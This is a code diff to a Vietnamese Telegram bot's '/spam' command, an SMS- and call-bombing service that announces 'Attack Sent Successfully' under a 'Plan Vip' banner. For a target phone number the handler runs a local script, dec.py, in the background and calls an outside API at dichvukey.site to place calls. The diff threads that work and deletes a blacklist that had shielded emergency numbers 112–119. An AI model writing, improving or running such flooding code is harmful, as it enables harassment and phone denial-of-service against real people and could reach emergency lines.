@@ -508,13 +508,7 @@ def handle_id_command(message):
 
 
    
-import os
-import time
-import tempfile
-import subprocess
-import requests
-
-blacklist = ["112", "113", "114", "115", "116", "117", "118", "119", "0", "1", "2", "3", "4", "078901631"]
+import threading
 
 @bot.message_handler(commands=['spam'])
 def supersms(message):
@@ -551,6 +545,7 @@ def supersms(message):
 
     sdt_request = f"84{sdt[1:]}" if sdt.startswith("0") else sdt
 
+    # Gửi kết quả ngay lập tức
     diggory_chat3 = f'''┌──⭓ Bot Hào Vip 😘
 │ 🚀 Attack Sent Successfully
 │ 💳 Plan Vip: Min 1 | Max 1000
@@ -561,32 +556,27 @@ def supersms(message):
 │ 📎 Vòng Lặp: {count}
 └────────────⭓'''
 
-    script_filename = "dec.py"
+    bot.reply_to(message, f"<blockquote>{diggory_chat3}</blockquote>", parse_mode="HTML")
+    user_last_command_time[user_id] = time.time()
 
-    try:
-        if not os.path.isfile(script_filename):
-            bot.reply_to(message, "Không tìm thấy file spam.")
-            return
+    # Chạy spam và API call trong thread nền
+    def spam_thread():
+        try:
+            script_filename = "dec.py"
+            if not os.path.isfile(script_filename):
+                return
 
-        with tempfile.NamedTemporaryFile(delete=False, suffix=".py") as temp_file:
-            with open(script_filename, 'r', encoding='utf-8') as file:
-                temp_file.write(file.read().encode('utf-8'))
-            temp_file_path = temp_file.name
+            with tempfile.NamedTemporaryFile(delete=False, suffix=".py") as temp_file:
+                with open(script_filename, 'r', encoding='utf-8') as file:
+                    temp_file.write(file.read().encode('utf-8'))
+                temp_file_path = temp_file.name
 
-        subprocess.Popen(["python", temp_file_path, sdt, str(count)])
-        requests.get(f'https://dichvukey.site/apivl/call1.php?sdt={sdt_request}')
-        user_last_command_time[user_id] = time.time()
+            subprocess.Popen(["python", temp_file_path, sdt, str(count)])
+            requests.get(f'https://dichvukey.site/apivl/call1.php?sdt={sdt_request}', timeout=5)
+        except Exception as e:
+            print(f"Lỗi spam: {e}")
 
-        bot.send_message(
-            message.chat.id,
-            f'<blockquote>{diggory_chat3}</blockquote>',
-            parse_mode='HTML'
-        )
-
-    except Exception as e:
-        bot.reply_to(message, "Đã xảy ra lỗi trong quá trình xử lý.")
-        print(f'Lỗi: {e}')
-
+    threading.Thread(target=spam_thread).start()
 
 
 
